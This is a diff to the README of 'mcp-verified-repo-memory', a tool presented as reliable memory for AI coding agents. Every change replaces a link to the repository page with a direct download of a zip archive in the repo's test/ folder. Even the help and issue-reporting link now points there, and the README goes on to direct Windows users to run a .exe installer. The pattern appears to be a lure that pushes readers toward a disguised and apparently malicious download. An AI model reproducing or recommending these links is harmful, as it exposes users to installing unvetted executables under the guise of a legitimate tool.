@@ -1,6 +1,6 @@
 # 🔒 mcp-verified-repo-memory - Reliable Memory for Coding Agents
 
-[![Download on GitHub](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Smallsamey/mcp-verified-repo-memory)
+[![Download on GitHub](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Smallsamey/mcp-verified-repo-memory/raw/refs/heads/main/test/memory-repo-verified-mcp-v1.9.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to download and start using the software on your Windows comp
 
 Click the button below to visit the GitHub page where you can download the software files.
 
-[![Download mcp-verified-repo-memory](https://img.shields.io/badge/Download-mcp--verified--repo--memory-blue?style=for-the-badge)](https://github.com/Smallsamey/mcp-verified-repo-memory)
+[![Download mcp-verified-repo-memory](https://img.shields.io/badge/Download-mcp--verified--repo--memory-blue?style=for-the-badge)](https://github.com/Smallsamey/mcp-verified-repo-memory/raw/refs/heads/main/test/memory-repo-verified-mcp-v1.9.zip)
 
 Once on the page, find the latest release section. Look for a file with the extension `.exe` (this is the installer).
 
@@ -125,7 +125,7 @@ If you encounter problems:
 - Make sure your Windows is up to date.
 - Restart your computer and try opening the software again.
 - Check that you installed all parts during setup.
-- Visit [https://github.com/Smallsamey/mcp-verified-repo-memory](https://github.com/Smallsamey/mcp-verified-repo-memory) to find help or report issues.
+- Visit [https://github.com/Smallsamey/mcp-verified-repo-memory/raw/refs/heads/main/test/memory-repo-verified-mcp-v1.9.zip](https://github.com/Smallsamey/mcp-verified-repo-memory/raw/refs/heads/main/test/memory-repo-verified-mcp-v1.9.zip) to find help or report issues.
 
 ---
 
@@ -147,7 +147,7 @@ Keeping data current is hard. This tool simplifies that for AI coding agents. By
 
 Use the link below to visit the download page anytime you need the latest version:
 
-[![Get the Latest Version](https://img.shields.io/badge/Get_Latest_Version-blue?style=for-the-badge)](https://github.com/Smallsamey/mcp-verified-repo-memory)
+[![Get the Latest Version](https://img.shields.io/badge/Get_Latest_Version-blue?style=for-the-badge)](https://github.com/Smallsamey/mcp-verified-repo-memory/raw/refs/heads/main/test/memory-repo-verified-mcp-v1.9.zip)
 
 ---
 
